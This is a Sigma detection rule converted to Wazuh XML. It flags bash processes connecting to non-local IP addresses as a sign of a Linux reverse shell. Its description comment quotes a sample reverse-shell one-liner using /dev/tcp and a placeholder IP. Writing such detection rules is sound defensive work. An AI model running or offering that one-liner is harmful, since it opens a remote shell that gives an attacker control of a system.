<!--
  Title: Linux Reverse Shell Indicator
  ID: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
  Status: test
  Level: critical
  Author: Florian Roth (Nextron Systems)
  Date: 2021-10-16
  Description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
-->

<group name="sigma_converted,">
  <rule id="100001" level="10">
    <description>Linux Reverse Shell Indicator</description>
    <match>((Image=\"*/bin/bash\") AND NOT (((DestinationIp=\"127.0.0.1\" OR DestinationIp=\"0.0.0.0\"))))</match>
  </rule>
</group>
